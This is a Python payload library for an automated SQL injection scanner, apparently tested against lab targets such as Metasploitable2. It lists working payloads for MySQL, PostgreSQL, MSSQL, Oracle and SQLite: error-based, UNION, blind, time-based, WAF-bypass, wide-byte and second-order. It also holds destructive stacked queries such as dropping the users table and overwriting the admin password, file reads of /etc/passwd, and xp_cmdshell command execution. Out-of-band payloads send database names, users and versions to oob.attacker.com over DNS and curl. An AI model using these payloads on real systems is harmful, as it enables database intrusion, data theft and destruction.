"""
SQLi payload library — P2 upgrade: 150+ payloads across all DB types.
"""

from typing import Dict, List

DB_ERROR_PATTERNS: Dict[str, List[str]] = {
    "mysql": [
        "SQL syntax.*MySQL",
        "Warning.*mysql_",
        "valid MySQL result",
        "MySqlException",
        "mysql_num_rows",
        "mysql_fetch",
        "check the manual that corresponds to your MySQL server",
        "Unknown column",
        "You have an error in your SQL syntax",
        "supplied argument is not a valid MySQL",
    ],
    "postgresql": [
        "PostgreSQL.*ERROR",
        "Warning.*pg_",
        "valid PostgreSQL result",
        "Npgsql.",
        "PG::SyntaxError",
        "org.postgresql.util.PSQLException",
    ],
    "mssql": [
        "Driver.* SQL[ -_]Server",
        "OLE DB.* SQL Server",
        "SqlException",
        "Unclosed quotation mark after the character string",
        "Microsoft OLE DB Provider for ODBC Drivers",
    ],
    "oracle": [
        "ORA-[0-9]{5}",
        "Oracle error",
        "Oracle.*Driver",
        "Warning.*oci_",
        "quoted string not properly terminated",
    ],
    "sqlite": [
        "SQLite/JDBCDriver",
        "SQLite.Exception",
        "System.Data.SQLite.SQLiteException",
        "sqlite3.OperationalError",
    ],
}

ERROR_BASED_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "'",
        '"',
        "1'",
        '1"',
        "\\",
        "')",
        '")',
        "');",
        '");',
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "admin'--",
        "admin' #",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
        "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
        "' AND extractvalue(1,concat(0x7e,(SELECT user())))--",
        "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
        "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT @@version),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' ORDER BY 1--",
        "' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT user(),database()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "'; SELECT 1--",
        "'; DROP TABLE test--",
        "'/**/OR/**/1=1--",
        "'+OR+1=1--",
        "'%09OR%091=1--",
        "'%0AOR%0A1=1--",
        "' oR 1=1--",
        "'/**/UnIoN/**/SeLeCt/**/1,2,3--",
    ],
    "postgresql": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' OR 'a'='a",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT version(),current_database()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "'; SELECT pg_sleep(3)--",
        "'; COPY (SELECT '') TO '/tmp/test'--",
    ],
    "mssql": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' OR 'a'='a",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT @@version,db_name()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "'; WAITFOR DELAY '0:0:3'--",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    ],
    "oracle": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' UNION SELECT NULL FROM DUAL--",
        "' UNION SELECT NULL,NULL FROM DUAL--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "' UNION SELECT table_name,NULL FROM all_tables--",
        "'; BEGIN dbms_lock.sleep(3); END;--",
    ],
    "sqlite": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT sqlite_version(),NULL--",
        "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--",
    ],
}

UNION_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version,user(),database()--",
        "') UNION SELECT 1,2,3--",
        "') UNION SELECT 1,2,3,4,5--",
    ],
}

BOOLEAN_BLIND_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' AND 1=1--",
        "' AND '1'='1",
        "') AND 1=1--",
        "' AND 2>1--",
        "' AND 'x'='x",
        "' AND 1=2--",
        "' AND '1'='2",
        "') AND 1=2--",
        "' AND 2<1--",
        "' AND 'x'='y",
        "' OR 1=1--",
        "' OR '1'='1",
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64",
        "' AND LENGTH(database())>0--",
    ],
    "postgresql": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'x'='x",
        "' AND 'x'='y",
        "' AND SUBSTRING(version(),1,1)='P",
    ],
}

TIME_BASED_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' AND SLEEP(3)--",
        "'; SELECT SLEEP(3)--",
        "' UNION SELECT SLEEP(3)--",
        "') AND SLEEP(3)--",
        '") AND SLEEP(3)--',
        "') AND SLEEP(3)#",
        "' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "'/**/AND/**/SLEEP(3)--",
        "'+AND+SLEEP(3)--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(3)--",
        "'; SELECT pg_sleep(5)--",
        "'||pg_sleep(3)--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:3'--",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
    "oracle": [
        "'; BEGIN dbms_lock.sleep(3); END;--",
        "'; BEGIN dbms_lock.sleep(5); END;--",
    ],
    "sqlite": [
        "'; SELECT randomblob(100000000)--",
    ],
}

ORDER_BY_PAYLOADS: List[str] = [
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 5--",
    "' ORDER BY 10--",
    "' ORDER BY 20--",
    "' ORDER BY 50--",
    "' ORDER BY 100--",
    "') ORDER BY 1--",
    "') ORDER BY 3--",
]

WAF_BYPASS_PAYLOADS: List[str] = [
    "'/**/OR/**/1=1--",
    "'/**/AND/**/1=1--",
    "'/**/UNION/**/SELECT/**/1,2,3--",
    "'+OR+1=1--",
    "'%09OR%091=1--",
    "'%0AOR%0A1=1--",
    "'%0DOR%0D1=1--",
    "'%0COR%0C1=1--",
    "'%A0OR%A01=1--",
    "' oR 1=1--",
    "' Or 1=1--",
    "' OR true--",
    "' || 1=1--",
    "' OR 1 LIKE 1--",
    "' OR 1 BETWEEN 1 AND 1--",
    "1%00' AND 1=1--",
    "%2527%20OR%201=1--",
    "' UN/**/ION SE/**/LECT 1,2,3--",
    "' OR 1=1 #",
    "' OR 1=1 %23",
    "' AND 1<>2--",
    "' AND 1!=2--",
]

# P6: Stacked query payloads for databases that support multi-statement execution
STACKED_QUERY_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "'; INSERT INTO users VALUES('hacker','pass')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; DROP TABLE users--",
        "'; SELECT * FROM users--",
        "'; CREATE TABLE pwned (id INT)--",
    ],
    "mssql": [
        "'; EXEC xp_cmdshell('whoami')--",
        "'; SELECT * FROM sys.tables--",
        "'; DROP TABLE users--",
        "'; EXEC sp_configure 'show advanced options',1--",
    ],
    "postgresql": [
        "'; SELECT pg_read_file('/etc/passwd')--",
        "'; CREATE TABLE pwned (id SERIAL)--",
        "'; COPY (SELECT '') TO '/tmp/pwned'--",
    ],
}

# P6: Additional boolean-blind paired payloads (numeric context, different quote styles)
BOOLEAN_BLIND_EXTENDED: List[List[str]] = [
    ["' AND 1=1--", "' AND 1=2--"],
    ['" AND 1=1--', '" AND 1=2--'],
    ["') AND 1=1--", "') AND 1=2--"],
    ['") AND 1=1--', '") AND 1=2--'],
    ["' AND '1'='1", "' AND '1'='2"],
    ['" AND "1"="1', '" AND "1"="2'],
    ["' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"],
    ["' AND LENGTH('a')=1--", "' AND LENGTH('a')=2--"],
]

# P9: Numeric context payloads — no quotes, critical for Metasploitable2
NUMERIC_BOOLEAN_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        " AND 1=1--",
        " AND 1=2--",
        " AND 5>3--",
        " AND 5<3--",
        " AND 2>1--",
        " AND 2<1--",
        " OR 1=1--",
        " OR 1=2--",
        " AND 5=5--",
        " AND 5=6--",
    ],
}

NUMERIC_ERROR_PAYLOADS: List[str] = [
    "1",
    "-1",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 OR 1=1",
    "0 OR 1=1",
    "1 UNION SELECT 1,2,3",
    "-1 UNION SELECT 1,2,3",
    "1'",
    '1"',
]

QUICK_PAYLOADS: List[str] = [
    "'",
    '"',
    "1'",
    '1"',
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' AND SLEEP(3)--",
    "' ORDER BY 1--",
    # P9: Numeric context quick payloads
    " AND 1=1",
    " AND 1=2",
    " OR 1=1",
    "-1 OR 1=1",
]

ALL_PAYLOADS: Dict[str, List[str]] = {
    "error": ERROR_BASED_PAYLOADS.get("mysql", []),
    "union": UNION_PAYLOADS.get("mysql", []),
    "boolean": BOOLEAN_BLIND_PAYLOADS.get("mysql", []),
    "time": TIME_BASED_PAYLOADS.get("mysql", []),
    "waf_bypass": WAF_BYPASS_PAYLOADS,
    "quick": QUICK_PAYLOADS,
    "stacked": STACKED_QUERY_PAYLOADS.get("mysql", []),
    "boolean_extended": BOOLEAN_BLIND_EXTENDED,
}


def get_error_payloads(db_type: str = "mysql", limit: int = 30) -> List[str]:
    return ERROR_BASED_PAYLOADS.get(db_type, ERROR_BASED_PAYLOADS["mysql"])[:limit]


def get_time_payloads(db_type: str = "mysql", limit: int = 8) -> List[str]:
    return TIME_BASED_PAYLOADS.get(db_type, TIME_BASED_PAYLOADS["mysql"])[:limit]


# ── Wide-Byte Injection (GBK bypass for addslashes/magic_quotes) ──

WIDE_BYTE_PAYLOADS: List[str] = [
    "%df'",  # Classic GBK wide-byte: %df' → 運'
    "%df%5c",  # %df%5c → 縗 (consumes the backslash)
    "%bf%27",  # Big5 variant
    "%df%27",  # Direct wide-byte quote
    "%aa%5c",  # Consumes backslash via valid 2-byte
    "%81%5c",  # Another GBK backslash consumer
    "%8e%5c",  # CP936 variant
    "%99%5c",  # Shift-JIS-like backslash consumption
    "' %%df%27 --",  # Mixed: normal quote then wide-byte
    "1%df%27 AND 1=1--",  # Wide-byte with boolean context
    "%df' OR 1=1--",  # Wide-byte OR injection
    "%df' UNION SELECT 1,2,3--",  # Wide-byte UNION
    "%df' AND SLEEP(3)--",  # Wide-byte time-based
]

# ── Second-Order SQLi Payloads ─────────────────────────────────
# These payloads are designed to be STORED in the database (via registration,
# profile update, etc.) and trigger when the stored value is used in a query.

SECOND_ORDER_PAYLOADS: Dict[str, List[str]] = {
    "create": [
        # 注册/创建场景 — payload 写入数据库
        "admin'--",
        "test' OR '1'='1",
        "user' UNION SELECT 1,2,3--",
        "profile' AND 1=1--",
        "admin'/*",
        "admin' OR '1'='1' --",
    ],
    "update": [
        # 更新资料场景
        "John' AND 1=1--",
        "Doe' OR SLEEP(2)--",
        "city' UNION SELECT @@version--",
        "email' OR '1'='1",
        "bio' AND 1=2--",
    ],
    "stored_trigger": [
        # 触发存储 payload 的注入 payload
        "' UNION SELECT 1,2,3,4,5--",
        "'; SELECT pg_sleep(2)--",
        "' AND 1=1 UNION SELECT 1,2,3--",
        "' OR '1'='1' UNION SELECT 1,2,3,4--",
    ],
    "oob_dns": [
        # 带 OOB DNS 的第二注入 payload
        "a' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\test'))--",
        "' AND 1=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\x'))--",
    ],
}

# ── OOB (Out-of-Band) Exfiltration Payloads ────────────────────

OOB_DNS_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.oob.attacker.com\\\\test'))",
        "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.oob.attacker.com\\\\x'))",
        "LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.oob.attacker.com\\\\v'))",
        "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.oob.attacker.com\\\\t'))",
    ],
    "mssql": [
        "EXEC master..xp_dirtree '\\\\\\\\oob.attacker.com\\\\test'",
        "EXEC master..xp_fileexist '\\\\\\\\oob.attacker.com\\\\x'",
        "DECLARE @q varchar(1024); SET @q='\\\\\\\\'+db_name()+'.oob.attacker.com\\\\d'; EXEC master..xp_dirtree @q",
    ],
    "postgresql": [
        "COPY (SELECT current_database()) TO PROGRAM 'nslookup oob.attacker.com'",
        "COPY (SELECT version()) TO PROGRAM 'curl http://oob.attacker.com/$(whoami)'",
        "PERFORM dblink_exec('host=oob.attacker.com dbname=x', 'SELECT 1')",
    ],
}

OOB_HTTP_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "SELECT http_get('http://oob.attacker.com/' || database())",
        "SELECT LOAD_FILE('\\\\\\\\oob.attacker.com\\\\' || database())",
        "SELECT LOAD_FILE(CONCAT('\\\\\\\\oob.attacker.com\\\\',user()))",
    ],
    "mssql": [
        "EXEC master..xp_cmdshell 'curl http://oob.attacker.com/$env:COMPUTERNAME'",
        "DECLARE @h INT; EXEC sp_oacreate 'WinHttp.WinHttpRequest.5.1', @h OUT; EXEC sp_oamethod @h, 'open', NULL, 'GET', 'http://oob.attacker.com/sqli', 'false';",
    ],
}


def get_stacked_payloads(db_type: str = "mysql", limit: int = 5) -> List[str]:
    return STACKED_QUERY_PAYLOADS.get(db_type, STACKED_QUERY_PAYLOADS["mysql"])[:limit]


def get_waf_bypass_payloads(limit: int = 20) -> List[str]:
    return WAF_BYPASS_PAYLOADS[:limit]


def get_wide_byte_payloads(limit: int = 8) -> List[str]:
    return WIDE_BYTE_PAYLOADS[:limit]


def get_second_order_payloads(category: str = "create", limit: int = 4) -> List[str]:
    payloads = SECOND_ORDER_PAYLOADS.get(category, SECOND_ORDER_PAYLOADS["create"])
    return payloads[:limit]


def get_oob_payloads(db_type: str = "mysql", limit: int = 3) -> List[str]:
    dns = OOB_DNS_PAYLOADS.get(db_type, OOB_DNS_PAYLOADS["mysql"])[:limit]
    http = OOB_HTTP_PAYLOADS.get(db_type, OOB_HTTP_PAYLOADS["mysql"])[:limit]
    return dns + http
